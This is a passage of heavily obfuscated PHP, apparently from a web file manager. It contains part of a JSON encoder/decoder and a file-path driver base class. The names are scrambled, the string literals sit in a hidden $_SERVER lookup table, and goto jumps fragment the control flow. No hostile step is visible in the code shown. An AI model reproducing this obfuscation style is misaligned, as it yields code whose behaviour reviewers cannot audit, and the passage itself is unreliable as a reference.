248) == 240: $B¸›ö¤óÅ‰ = pack($aò±è‚…Î[1918], $B¶‚Ğì¼¦Ì, ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 1]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 2]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 3])); $e¿¼ÚÇ¾ùó += 3; $D¥§Ğ‡¼Œ’ = $this->utf82utf16($B¸›ö¤óÅ‰); $b¢†­êÙ .= sprintf($aò±è‚…Î[1919], bin2hex($D¥§Ğ‡¼Œ’)); break; case ($B¶‚Ğì¼¦Ì & 252) == 248: $B¸›ö¤óÅ‰ = pack($aò±è‚…Î[1918], $B¶‚Ğì¼¦Ì, ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 1]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 2]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 3]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 4])); $e¿¼ÚÇ¾ùó += 4; $D¥§Ğ‡¼Œ’ = $this->utf82utf16($B¸›ö¤óÅ‰); $b¢†­êÙ .= sprintf($aò±è‚…Î[1919], bin2hex($D¥§Ğ‡¼Œ’)); break; case ($B¶‚Ğì¼¦Ì & 254) == 252: $B¸›ö¤óÅ‰ = pack($aò±è‚…Î[1918], $B¶‚Ğì¼¦Ì, ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 1]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 2]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 3]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 4]), ord($C¡Œ§ìŠà›[$e¿¼ÚÇ¾ùó + 5])); $e¿¼ÚÇ¾ùó += 5; $D¥§Ğ‡¼Œ’ = $this->utf82utf16($B¸›ö¤óÅ‰); $b¢†­êÙ .= sprintf($aò±è‚…Î[1919], bin2hex($D¥§Ğ‡¼Œ’)); break; } } return $aò±è‚…Î[113] . $b¢†­êÙ . $aò±è‚…Î[113]; case $aò±è‚…Î[1920]: if (is_array($C¡Œ§ìŠà›) && count($C¡Œ§ìŠà›) && array_keys($C¡Œ§ìŠà›) !== range(0, sizeof($C¡Œ§ìŠà›) - 1)) { $F†‚¬é­¦Ÿ = array_map(array($this, $aò±è‚…Î[1921]), array_keys($C¡Œ§ìŠà›), array_values($C¡Œ§ìŠà›)); foreach ($F†‚¬é­¦Ÿ as $dßØÅšèš«) { if (Services_JSON::isError($dßØÅšèš«)) { return $dßØÅšèš«; } } return $aò±è‚…Î[1068] . join($aò±è‚…Î[47], $F†‚¬é­¦Ÿ) . $aò±è‚…Î[312]; } $cŠ±‰Õ¹µÈ = array_map(array($this, $aò±è‚…Î[1922]), $C¡Œ§ìŠà›); foreach ($cŠ±‰Õ¹µÈ as $BÄÚåÛê¼İ) { if (Services_JSON::isError($BÄÚåÛê¼İ)) { return $BÄÚåÛê¼İ; } } return $aò±è‚…Î[154] . join($aò±è‚…Î[47], $cŠ±‰Õ¹µÈ) . $aò±è‚…Î[472]; case $aò±è‚…Î[1923]: $D¤Ì‹ˆø Å = get_object_vars($C¡Œ§ìŠà›); $F†‚¬é­¦Ÿ = array_map(array($this, $aò±è‚…Î[1921]), array_keys($D¤Ì‹ˆø Å), array_values($D¤Ì‹ˆø Å)); foreach ($F†‚¬é­¦Ÿ as $dßØÅšèš«) { if (Services_JSON::isError($dßØÅšèš«)) { return $dßØÅšèš«; } } return $aò±è‚…Î[1068] . join($aò±è‚…Î[47], $F†‚¬é­¦Ÿ) . $aò±è‚…Î[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $aò±è‚…Î[101] : new Services_JSON_Error(gettype($C¡Œ§ìŠà›) . $aò±è‚…Î[1924]); } } function name_value($f®©ÁÁñ, $F¨²İ„­åã) { $e÷¯Ê«§¾ = $this->encode($F¨²İ„­åã); if (Services_JSON::isError($e÷¯Ê«§¾)) { return $e÷¯Ê«§¾; } return $this->encode(strval($f®©ÁÁñ)) . $_SERVER[Äº¡•ô™Ÿ][4] . $e÷¯Ê«§¾; } function reduce_string($e©‡»Ù¶•) { $d¤–ä±ò–¿ =& $_SERVER[Äº¡•ô™Ÿ]; $e©‡»Ù¶• = preg_replace(array($d¤–ä±ò–¿[1925], $d¤–ä±ò–¿[1926], $d¤–ä±ò–¿[1927]), $d¤–ä±ò–¿[33], $e©‡»Ù¶•); return trim($e©‡»Ù¶•); } function decode($CÇ¹Â”£‚¬) { $bÏİÑ„›š‘ =& $_SERVER[Äº¡•ô™Ÿ]; $CÇ¹Â”£‚¬ = $this->reduce_string($CÇ¹Â”£‚¬); switch (strtolower($CÇ¹Â”£‚¬)) { case $bÏİÑ„›š‘[1575]: return !0; case $bÏİÑ„›š‘[1577]: return !1; case $bÏİÑ„›š‘[101]: return null; default: $e±´¢¤‘Ñ„ = array(); if (is_numeric($CÇ¹Â”£‚¬)) { return (double) $CÇ¹Â”£‚¬ == (int) $CÇ¹Â”£‚¬ ? (int) $CÇ¹Â”£‚¬ : (double) $CÇ¹Â”£‚¬; } elseif (preg_match($bÏİÑ„›š‘[1928], $CÇ¹Â”£‚¬, $e±´¢¤‘Ñ„) && $e±´¢¤‘Ñ„[1] == $e±´¢¤‘Ñ„[2]) { $E˜¾ÑÎ¬Ú = substr($CÇ¹Â”£‚¬, 0, 1); $EƒĞÂš´Ìœ = substr($CÇ¹Â”£‚¬, 1, -1); $fõÉ•™ºÀ = $bÏİÑ„›š‘[33]; $D¡ÔÃ»ÙÀÃ = strlen($EƒĞÂš´Ìœ); for ($cĞŞÕ§×’ = 0; $cĞŞÕ§×’ < $D¡ÔÃ»ÙÀÃ; ++$cĞŞÕ§×’) { $bİÀ²¤ÁÆÃ = substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 2); $D‡òŒ¬…¬® = ord($EƒĞÂš´Ìœ[$cĞŞÕ§×’]); switch (!0) { case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1916]: $fõÉ•™ºÀ .= chr(8); ++$cĞŞÕ§×’; break; case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1552]: $fõÉ•™ºÀ .= chr(9); ++$cĞŞÕ§×’; break; case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1550]: $fõÉ•™ºÀ .= chr(10); ++$cĞŞÕ§×’; break; case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1917]: $fõÉ•™ºÀ .= chr(12); ++$cĞŞÕ§×’; break; case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1551]: $fõÉ•™ºÀ .= chr(13); ++$cĞŞÕ§×’; break; case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1333]: case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1929]: case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1545]: case $bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1547]: if ($E˜¾ÑÎ¬Ú == $bÏİÑ„›š‘[113] && $bİÀ²¤ÁÆÃ != $bÏİÑ„›š‘[1929] || $E˜¾ÑÎ¬Ú == $bÏİÑ„›š‘[55] && $bİÀ²¤ÁÆÃ != $bÏİÑ„›š‘[1333]) { $fõÉ•™ºÀ .= $EƒĞÂš´Ìœ[++$cĞŞÕ§×’]; } break; case preg_match($bÏİÑ„›š‘[1930], substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 6)): $d¾³Ê–ğ«· = chr(hexdec(substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’ + 2, 2))) . chr(hexdec(substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’ + 4, 2))); $fõÉ•™ºÀ .= $this->utf162utf8($d¾³Ê–ğ«·); $cĞŞÕ§×’ += 5; break; case $D‡òŒ¬…¬® >= 32 && $D‡òŒ¬…¬® <= 127: $fõÉ•™ºÀ .= $EƒĞÂš´Ìœ[$cĞŞÕ§×’]; break; case ($D‡òŒ¬…¬® & 224) == 192: $fõÉ•™ºÀ .= substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 2); ++$cĞŞÕ§×’; break; case ($D‡òŒ¬…¬® & 240) == 224: $fõÉ•™ºÀ .= substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 3); $cĞŞÕ§×’ += 2; break; case ($D‡òŒ¬…¬® & 248) == 240: $fõÉ•™ºÀ .= substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 4); $cĞŞÕ§×’ += 3; break; case ($D‡òŒ¬…¬® & 252) == 248: $fõÉ•™ºÀ .= substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 5); $cĞŞÕ§×’ += 4; break; case ($D‡òŒ¬…¬® & 254) == 252: $fõÉ•™ºÀ .= substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 6); $cĞŞÕ§×’ += 5; break; } } return $fõÉ•™ºÀ; } elseif (preg_match($bÏİÑ„›š‘[1931], $CÇ¹Â”£‚¬) || preg_match($bÏİÑ„›š‘[1932], $CÇ¹Â”£‚¬)) { goto B“ìÀ©ÃÍ“; F¨ç¿Î¹–Ğ: for ($cĞŞÕ§×’ = 0; $cĞŞÕ§×’ <= $D¡ÔÃ»ÙÀÃ; ++$cĞŞÕ§×’) { $C¥İ¦äÄ÷š = end($aœƒ­äÈÜ†); $bİÀ²¤ÁÆÃ = substr($EƒĞÂš´Ìœ, $cĞŞÕ§×’, 2); if ($cĞŞÕ§×’ == $D¡ÔÃ»ÙÀÃ || $EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[47] && $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]] == SERVICES_JSON_SLICE) { $eì‡¡Óòù = substr($EƒĞÂš´Ìœ, $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[260]], $cĞŞÕ§×’ - $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[260]]); array_push($aœƒ­äÈÜ†, array($bÏİÑ„›š‘[1933] => SERVICES_JSON_SLICE, $bÏİÑ„›š‘[260] => $cĞŞÕ§×’ + 1, $bÏİÑ„›š‘[1934] => !1)); if (reset($aœƒ­äÈÜ†) == SERVICES_JSON_IN_ARR) { array_push($FÓêÊˆêˆ, $this->decode($eì‡¡Óòù)); } elseif (reset($aœƒ­äÈÜ†) == SERVICES_JSON_IN_OBJ) { $bÃ¶„ÙÇ = array(); if (preg_match($bÏİÑ„›š‘[1935], $eì‡¡Óòù, $bÃ¶„ÙÇ)) { $A»ß¹Ú¬¥ = $this->decode($bÃ¶„ÙÇ[1]); $C²¿¿é²½ = $this->decode($bÃ¶„ÙÇ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eƒÙ´†îšÀ[$A»ß¹Ú¬¥] = $C²¿¿é²½; } else { $eƒÙ´†îšÀ->{$A»ß¹Ú¬¥} = $C²¿¿é²½; } } elseif (preg_match($bÏİÑ„›š‘[1936], $eì‡¡Óòù, $bÃ¶„ÙÇ)) { $A»ß¹Ú¬¥ = $bÃ¶„ÙÇ[1]; $C²¿¿é²½ = $this->decode($bÃ¶„ÙÇ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eƒÙ´†îšÀ[$A»ß¹Ú¬¥] = $C²¿¿é²½; } else { $eƒÙ´†îšÀ->{$A»ß¹Ú¬¥} = $C²¿¿é²½; } } } } elseif (($EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[113] || $EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[55]) && $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]] != SERVICES_JSON_IN_STR) { array_push($aœƒ­äÈÜ†, array($bÏİÑ„›š‘[1933] => SERVICES_JSON_IN_STR, $bÏİÑ„›š‘[260] => $cĞŞÕ§×’, $bÏİÑ„›š‘[1934] => $EƒĞÂš´Ìœ[$cĞŞÕ§×’])); } elseif ($EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1934]] && $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]] == SERVICES_JSON_IN_STR && (strlen(substr($EƒĞÂš´Ìœ, 0, $cĞŞÕ§×’)) - strlen(rtrim(substr($EƒĞÂš´Ìœ, 0, $cĞŞÕ§×’), $bÏİÑ„›š‘[95]))) % 2 != 1) { array_pop($aœƒ­äÈÜ†); } elseif ($EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[154] && in_array($C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($aœƒ­äÈÜ†, array($bÏİÑ„›š‘[1933] => SERVICES_JSON_IN_ARR, $bÏİÑ„›š‘[260] => $cĞŞÕ§×’, $bÏİÑ„›š‘[1934] => !1)); } elseif ($EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[472] && $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]] == SERVICES_JSON_IN_ARR) { array_pop($aœƒ­äÈÜ†); } elseif ($EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[1068] && in_array($C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($aœƒ­äÈÜ†, array($bÏİÑ„›š‘[1933] => SERVICES_JSON_IN_OBJ, $bÏİÑ„›š‘[260] => $cĞŞÕ§×’, $bÏİÑ„›š‘[1934] => !1)); } elseif ($EƒĞÂš´Ìœ[$cĞŞÕ§×’] == $bÏİÑ„›š‘[312] && $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]] == SERVICES_JSON_IN_OBJ) { array_pop($aœƒ­äÈÜ†); } elseif ($bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1937] && in_array($C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($aœƒ­äÈÜ†, array($bÏİÑ„›š‘[1933] => SERVICES_JSON_IN_CMT, $bÏİÑ„›š‘[260] => $cĞŞÕ§×’, $bÏİÑ„›š‘[1934] => !1)); $cĞŞÕ§×’++; } elseif ($bİÀ²¤ÁÆÃ == $bÏİÑ„›š‘[1938] && $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[1933]] == SERVICES_JSON_IN_CMT) { array_pop($aœƒ­äÈÜ†); $cĞŞÕ§×’++; for ($a³‡¼¤¬Å” = $C¥İ¦äÄ÷š[$bÏİÑ„›š‘[260]]; $a³‡¼¤¬Å” <= $cĞŞÕ§×’; ++$a³‡¼¤¬Å”) { $EƒĞÂš´Ìœ = substr_replace($EƒĞÂš´Ìœ, $bÏİÑ„›š‘[50], $a³‡¼¤¬Å”, 1); } } } if (reset($aœƒ­äÈÜ†) == SERVICES_JSON_IN_ARR) { return $FÓêÊˆêˆ; } elseif (reset($aœƒ­äÈÜ†) == SERVICES_JSON_IN_OBJ) { return $eƒÙ´†îšÀ; } goto bçŞˆ–¶ñ; EŠŞãƒö­: $EƒĞÂš´Ìœ = $this->reduce_string($EƒĞÂš´Ìœ); if ($EƒĞÂš´Ìœ == $bÏİÑ„›š‘[33]) { if (reset($aœƒ­äÈÜ†) == SERVICES_JSON_IN_ARR) { return $FÓêÊˆêˆ; } else { return $eƒÙ´†îšÀ; } } $D¡ÔÃ»ÙÀÃ = strlen($EƒĞÂš´Ìœ); goto F¨ç¿Î¹–Ğ; B“ìÀ©ÃÍ“: if ($CÇ¹Â”£‚¬[0] == $bÏİÑ„›š‘[154]) { $aœƒ­äÈÜ† = array(SERVICES_JSON_IN_ARR); $FÓêÊˆêˆ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aœƒ­äÈÜ† = array(SERVICES_JSON_IN_OBJ); $eƒÙ´†îšÀ = array(); } else { $aœƒ­äÈÜ† = array(SERVICES_JSON_IN_OBJ); $eƒÙ´†îšÀ = new stdClass(); } } array_push($aœƒ­äÈÜ†, array($bÏİÑ„›š‘[1933] => SERVICES_JSON_SLICE, $bÏİÑ„›š‘[260] => 0, $bÏİÑ„›š‘[1934] => !1)); $EƒĞÂš´Ìœ = substr($CÇ¹Â”£‚¬, 1, -1); goto EŠŞãƒö­; bçŞˆ–¶ñ: } } } function isError($BğÎ…Œ¤¯†, $aÑÍÁõÆÕ¯ = null) { $FÇÜ¶ÅÆÛÀ =& $_SERVER[Äº¡•ô™Ÿ]; if (class_exists($FÇÜ¶ÅÆÛÀ[1939])) { return PEAR::isError($BğÎ…Œ¤¯†, $aÑÍÁõÆÕ¯); } elseif (is_object($BğÎ…Œ¤¯†) && (get_class($BğÎ…Œ¤¯†) == $FÇÜ¶ÅÆÛÀ[1940] || is_subclass_of($BğÎ…Œ¤¯†, $FÇÜ¶ÅÆÛÀ[1940]))) { return !0; } return !1; } } if (class_exists($_SERVER[Äº¡•ô™Ÿ][1941])) { class Services_JSON_Error extends PEAR_Error { function __construct($EØ¨ÍŠ«¡ = "\x75\x6e\x6b\x6e\x6f\167\156\x20\x65\x72\162\157\x72", $EÜ³ãÏîÛ = null, $bîšƒ¥×¯Ò = null, $DšÕªÏ¡»‰ = null, $B®óÀÜÕà„ = null) { parent::PEAR_Error($EØ¨ÍŠ«¡, $EÜ³ãÏîÛ, $bîšƒ¥×¯Ò, $DšÕªÏ¡»‰, $B®óÀÜÕà„); } } } else { class Services_JSON_Error { function __construct($F¾Ô™ªò¯Ì = "\165\x6e\153\156\x6f\167\x6e\40\x65\x72\x72\157\x72", $e÷³˜ÏØòÙ = null, $cì˜Æâ¼¾ = null, $A¼âƒô²æ‚ = null, $C¡Í¼Å©‚Ô = null) { } } } goto F‘òãˆ¯; fÖÈ®´“ˆ„: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $C¤‘É•ğ»± =& $_SERVER[Äº¡•ô™Ÿ]; $this->objectDriver = array($C¤‘É•ğ»±[57], $C¤‘É•ğ»±[58], $C¤‘É•ğ»±[59], $C¤‘É•ğ»±[60], $C¤‘É•ğ»±[61], $C¤‘É•ğ»±[62], $C¤‘É•ğ»±[63], $C¤‘É•ğ»±[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($cèçö›Ë‰) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($cèçö›Ë‰, $_SERVER[Äº¡•ô™Ÿ][8]); } return $cèçö›Ë‰; } public function getPathName($A™‘İÁêé) { return $A™‘İÁêé; } public function iconvApp($fÜ©ö¦çÄ¾) { return $fÜ©ö¦çÄ¾; } public function iconvSystem($d¯„àËÒ°Ó) { return $d¯„àËÒ°Ó; } public function iconvTo($Fë„Œ”ˆÆï, $Bñ‡«Ñµğí, $CãÒ†ô‹Ã–) { goto bØÛ…áŒÕÚ; Eµ³ƒÉññ›: $cä£‰Œ·¼ = $cä£‰Œ·¼ ? $cä£‰Œ·¼ : $Fë„Œ”ˆÆï; if (strstr($cä£‰Œ·¼, $B§œšçàöŒ[69])) { $cä£‰Œ·¼ = str_replace($B§œšçàöŒ[69], $B§œšçàöŒ[70], $cä£‰Œ·¼); } $c±„õ±ìŸ¿[$Bñ‡«Ñµğí . $B§œšçàöŒ[66] . $CãÒ†ô‹Ã– . $B§œšçàöŒ[67] . $Fë„Œ”ˆÆï] = $cä£‰Œ·¼; goto dàçÛƒ¿­; B Íß‘Ô…‘: $EÎÇ³çôêŠ = $Bñ‡«Ñµğí . $B§œšçàöŒ[66] . $CãÒ†ô‹Ã– . $B§œšçàöŒ[67] . $Fë„Œ”ˆÆï; if (isset($c±„õ±ìŸ¿[$EÎÇ³çôêŠ])) { return $c±„õ±ìŸ¿[$EÎÇ³çôêŠ]; } if (function_exists($B§œšçàöŒ[68])) { $cä£‰Œ·¼ = @mb_convert_encoding($Fë„Œ”ˆÆï, $CãÒ†ô‹Ã–, $Bñ‡«Ñµğí); } else { $cä£‰Œ·¼ = @iconv($Bñ‡«Ñµğí, $CãÒ†ô‹Ã–, $Fë„Œ”ˆÆï); } goto Eµ³ƒÉññ›; E½‹ñ¢µõ¶: return $cä£‰Œ·¼; goto dÖ™ä¬Ş²”; dàçÛƒ¿­: $c±„õ±ìŸ¿[$CãÒ†ô‹Ã– . $B§œšçàöŒ[66] . $Bñ‡«Ñµğí . $B§œšçàöŒ[67] . $Fë„Œ”ˆÆï] = $Fë„Œ”ˆÆï; $c±„õ±ìŸ¿[$CãÒ†ô‹Ã– . $B§œšçàöŒ[66] . $Bñ‡«Ñµğí . $B§œšçàöŒ[67] . $cä£‰Œ·¼] = $Fë„Œ”ˆÆï; $c±„õ±ìŸ¿[$Bñ‡«Ñµğí . $B§œšçàöŒ[66] . $CãÒ†ô‹Ã– . $B§œšçàöŒ[67] . $cä£‰Œ·¼] = $cä£‰Œ·¼; goto E½‹ñ¢µõ¶; bØÛ…áŒÕÚ: $B§œšçàöŒ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$Fë„Œ”ˆÆï || !function_exists($B§œšçàöŒ[65])) { return $Fë„Œ”ˆÆï; } static $c±„õ±ìŸ¿ = array(); goto B Íß‘Ô…‘; dÖ™ä¬Ş²”: } public function getPathInner($cÏËÕñ”) { $aÚÌ¼ÄÍ‡ = IO::init($cÏËÕñ”); return $aÚÌ¼ÄÍ‡->path; } public function getPathOuter($aŠ¢ÎŞÃíô) { $D»…î„Ò†À =& $_SERVER[Äº¡•ô™Ÿ]; $d¿³áìÃĞ = strlen(trim($this->pathBase, $D»…î„Ò†À[8])); $aŠ¢ÎŞÃíô = substr(trim($aŠ¢ÎŞÃíô, $D»…î„Ò†À[8]), $d¿³áìÃĞ); return $this->pathDriver . $D»…î„Ò†À[8] . ltrim($aŠ¢ÎŞÃíô, $D»…î„Ò†À[8]); } public function isParentOf($Aô«‰¢˜£ˆ, $d†•·ïõÏ) { $A¡«¢ß›” =& $_SERVER[Äº¡•ô™Ÿ]; $Aô«‰¢˜£ˆ = rtrim(strtolower($Aô«‰¢˜£ˆ), $A¡«¢ß›”[8]) . $A¡«¢ß›”[8]; $d†•·ïõÏ = rtrim(strtolower($d†•·ïõÏ), $A¡«¢ß›”[8]) . $A¡«¢ß›”[8]; $c‘­‘µ®•‰ = strpos($d†•·ïõÏ, $Aô«‰¢˜£ˆ) === 0; return $c‘­‘µ®•‰; } public function getType() { $fæ¢ëöŠ«É =& $_SERVER[Äº¡•ô™Ÿ]; $D¡ß¿Ô¡¬ = str_replace($fæ¢ëöŠ«É[71], $fæ¢ëöŠ«É[33], get_class($this)); return strtolower($D¡ß¿Ô¡¬); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($c¶Çå·Ü¤, $aà«Ê÷²†”) { $AÖ‚Í¢ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $BçåÊÃÄÆÊ = rtrim($c¶Çå·Ü¤, $AÖ‚Í¢ƒ[8]) . $AÖ‚Í¢ƒ[8] . $aà«Ê÷²†”; $c¨ˆİº¢° = $this->exist($BçåÊÃÄÆÊ); return $c¨ˆİº¢° ? $BçåÊÃÄÆÊ : !1; } public function renameObject($bÌƒ÷ÄíĞù, $B¹«ŞÓ“Ö) { goto aÑß©ÑŸŠ; F„œÍâ¢öÖ: $bÌƒ÷ÄíĞù = $this->getPathOuter($bÌƒ÷ÄíĞù); $B¹«ŞÓ“Ö = $this->pathFather($bÌƒ÷ÄíĞù) . $B¹«ŞÓ“Ö; if (IO::isFile($bÌƒ÷ÄíĞù)) { $C¼»“±·”† = IO::copy($bÌƒ÷ÄíĞù, $this->pathFather($bÌƒ÷ÄíĞù), REPEAT_RENAME_FOLDER, $a¼ÔØ¬ìÓ); if ($C¼»“±·”†) { IO::remove($bÌƒ÷ÄíĞù); } } else { $C¼»“±·”† = IO::mkdir($B¹«ŞÓ“Ö); if (!$C¼»“±·”†) { return !1; } $FÛ–…ãÓê = IO::listPath($bÌƒ÷ÄíĞù, !0); $F®Ø²šØØ = array_merge($FÛ–…ãÓê[$Bä´è‰ˆ›å[73]], $FÛ–…ãÓê[$Bä´è‰ˆ›å[74]]); foreach ($F®Ø²šØØ as $eÇ¤‚¤ÀÑÍ) { IO::move($eÇ¤‚¤ÀÑÍ[$Bä´è‰ˆ›å[75]], $B¹«ŞÓ“Ö, REPEAT_RENAME_FOLDER); } IO::remove($bÌƒ÷ÄíĞù); } goto b¡º¼±‰ ; b¡º¼±‰ : return $C¼»“±·”† ? $B¹«ŞÓ“Ö : !1; goto a©¸’æÒ§­; aÑß©ÑŸŠ: $Bä´è‰ˆ›å =& $_SERVER[Äº¡•ô™Ÿ]; $a¼ÔØ¬ìÓ = $B¹«ŞÓ“Ö; Hook::trigger($Bä´è‰ˆ›å[72], $this, $bÌƒ÷ÄíĞù, $this, $this->pathFather($bÌƒ÷ÄíĞù) . $B¹«ŞÓ“Ö); goto F„œÍâ¢öÖ; a©¸’æÒ§­: } public function tempFile($DÚô¶ŒİĞØ = '', $dğ”Îöèø™ = '') { goto Dö‹¹‡„Ã–; Dö‹¹‡„Ã–: if (!$DÚô¶ŒİĞØ) { $DÚô¶ŒİĞØ = rand_string(15); } $d‹â¿ï¼ÛŸ = TEMP_FILES . rand_string(15) . $_SERVER[Äº¡•ô™Ÿ][8]; @mkdir($d‹â¿ï¼ÛŸ, 511, !0); goto EÍïºÀå; EÍïºÀå: $AğÕ›ª³ = $d‹â¿ï¼ÛŸ . $DÚô¶ŒİĞØ; @touch($AğÕ›ª³); if ($dğ”Îöèø™) { file_put_contents($AğÕ›ª³, $dğ”Îöèø™); } goto Aã÷ªñ÷Ó; Aã÷ªñ÷Ó: return $AğÕ›ª³; goto B»«¥Ï¸šî; B»«¥Ï¸šî: } public function tempFileRemve($dƒÈ©Œ µ) { @unlink($dƒÈ©Œ µ); @rmdir($this->pathFather($dƒÈ©Œ µ)); } public function mkfile($B¹™Ò¡†ğ, $A·ËÒ™ì›º = '', $A›ÎÛ´š = REPEAT_RENAME) { } public function mkdir($cˆ’„ßÙé, $Aø·˜²Ï© = REPEAT_SKIP) { } public function copyFile($bÄçíàÌ¾Å, $EŸİµ¹ğ³Ù) { } public function moveFile($eÅ‚‘§– ­, $aŞ¨¨«–ª) { } public function remove($ağŞÆ–ì—¡) { if ($this->isFile($ağŞÆ–ì—¡)) { return $this->delFile($ağŞÆ–ì—¡); } return $this->delFolder($ağŞÆ–ì—¡); } public function rename($AÁÀªÍÂ–›, $BŸ°ïÚÓ§ƒ) { } public function exist($BøëÑ­¢…Ë) { } public function findByHash($bĞ¥Ì®¯°© = '', $b·ĞÈ¨„à = '') { return !1; } public function isFile($CÃßŒ íÄ) { } public function isFolder($f ‰©‘ƒ×) { } public function size($b¯×¼İ·ôá) { } public function info($CÎÈÄ¯É§) { } public function infoSimple($D¨‘›Ä‡¸ä) { return $this->info($D¨‘›Ä‡¸ä); } public function infoAuth($e†­÷–áĞ—) { return $this->info($e†­÷–áĞ—); } public function infoFull($eÓ¥—™¿ª¨) { return $this->info($eÓ¥—™¿ª¨); } public function infoWithChildren($a¬ÈÖ”‰åƒ) { $aáŠöì‰ëÎ =& $_SERVER[Äº¡•ô™Ÿ]; $c´ÍŸùĞ‘é = $this->info($a¬ÈÖ”‰åƒ); if ($c´ÍŸùĞ‘é && $c´ÍŸùĞ‘é[$aáŠöì‰ëÎ[29]] == $aáŠöì‰ëÎ[76]) { $c¤×‹ â¥ô = array($aáŠöì‰ëÎ[77] => 0, $aáŠöì‰ëÎ[78] => 0, $aáŠöì‰ëÎ[79] => 0); $this->infoChildren($a¬ÈÖ”‰åƒ, $c¤×‹ â¥ô); $c´ÍŸùĞ‘é[$aáŠöì‰ëÎ[77]] = $c¤×‹ â¥ô[$aáŠöì‰ëÎ[77]]; $c´ÍŸùĞ‘é[$aáŠöì‰ëÎ[80]] = array($aáŠöì‰ëÎ[81] => $c¤×‹ â¥ô[$aáŠöì‰ëÎ[78]], $aáŠöì‰ëÎ[82] => $c¤×‹ â¥ô[$aáŠöì‰ëÎ[79]]); } return $c´ÍŸùĞ‘é; } public function listPath($A—•î½—¸î, $Aˆ§í®¯›ì = false) { } public function has($E“æÒÂóÑŒ, $D²æÛ¿íÆ = false, $bƒÎñ¹ø± = false) { } public function canRead($DÎàßÓà¢à) { } public function canWrite($f´Œ²É) { } public function getContent($eñÓä¹†µ«) { } public function setContent($CÔ˜›ïÀ¥Ÿ, $bÀ§ãÄÚ˜ä = '') { } protected function infoChildren($c¤öæ‚ …, &$eğñ‘à„»¯) { $bµ”ĞÙæ¸ò =& $_SERVER[Äº¡•ô™Ÿ]; check_abort(); $E˜ÃÒÙ¨Ãˆ = $this->listPath($c¤öæ‚ …, !0); $E˜ÃÒÙ¨Ãˆ = array_merge($E˜ÃÒÙ¨Ãˆ[$bµ”ĞÙæ¸ò[74]], $E˜ÃÒÙ¨Ãˆ[$bµ”ĞÙæ¸ò[73]]); foreach ($E˜ÃÒÙ¨Ãˆ as $BèóâÍëò–) { if ($BèóâÍëò–[$bµ”ĞÙæ¸ò[29]] == $bµ”ĞÙæ¸ò[76]) { $eğñ‘à„»¯[$bµ”ĞÙæ¸ò[79]]++; $EÄŞåä— = $this->getPathInner($BèóâÍëò–[$bµ”ĞÙæ¸ò[75]]); $this->infoChildren($EÄŞåä—, $eğñ‘à„»¯); } else { 